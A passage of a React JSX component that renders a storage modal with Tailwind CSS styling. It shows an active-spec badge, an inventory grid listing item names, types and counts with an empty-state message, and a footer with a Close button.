                    <div className="text-sm font-extrabold text-white mt-0.5">{parsedStandData.spec_storage || 'Empty'}</div>
                  </div>
                  <span className="text-xs bg-blue-500/10 text-blue-400 border border-blue-500/30 px-3 py-1 rounded-xl font-mono">
                    Active Spec
                  </span>
                </div>
              </div>
            )}

            {/* Modal Body: Inventory */}
            {storageTab === 'inventory' && (
              <div className="p-5 overflow-y-auto">
                {parsedInventoryData.length === 0 ? (
                  <div className="text-center py-12 text-slate-500 font-bold text-xs">
                    No inventory item data recorded.
                  </div>
                ) : (
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    {parsedInventoryData.map((item, idx) => (
                      <div 
                        key={idx} 
                        className="bg-slate-950 border border-white/10 rounded-2xl p-4 flex items-center justify-between hover:border-blue-500/40 transition-all"
                      >
                        <div className="min-w-0 pr-2">
                          <div className="font-bold text-xs sm:text-sm text-white truncate">{item.name}</div>
                          <div className="text-[10px] text-slate-400 mt-0.5">{item.type}</div>
                        </div>
                        <div className="bg-blue-600/20 text-blue-400 border border-blue-500/30 text-xs font-extrabold px-3 py-1 rounded-xl font-mono shrink-0">
                          x{item.count}
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}

            {/* Modal Footer */}
            <div className="p-4 bg-slate-950 border-t border-white/10 flex justify-end">
              <button
                onClick={() => setIsStorageModalOpen(false)}
                className="bg-slate-800 hover:bg-slate-700 text-white text-xs font-bold py-2.5 px-6 rounded-xl transition-all cursor-pointer"
              >
                Close
              </button>
            </div>

          </div>
        </div>
      )}

    </div>
  );
}
